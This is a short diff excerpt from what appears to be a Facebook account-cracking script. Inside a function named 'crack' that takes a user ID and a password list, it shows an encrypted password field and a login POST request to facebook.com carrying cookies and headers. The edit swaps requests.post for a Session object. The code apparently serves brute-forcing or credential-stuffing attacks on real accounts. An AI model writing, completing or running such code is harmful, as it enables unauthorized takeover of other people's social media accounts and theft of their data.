@@ -162,7 +162,7 @@ def crack(uid, password_list, total_count):
     'encpass': '#PWD_BROWSER:5:1765689066:AblQAPqiIBmf1GeYhIFqNRm2kklair028MSzKLAXp61ir1k5X+XQmIOVTE454LY+FPDV7z9wQcnSpimPYwJPCBCn/KiNHeDuAI+G0oH4CGV1oXXHnyp3p+p9kC5Snh8zsFSOmU+CdRGbXCUOTg==',
 }
 
-            respons = requests.post(
+            respons = Session.post(
             'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY1Njg4NzU0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
             cookies=cookies,
             headers=headers,
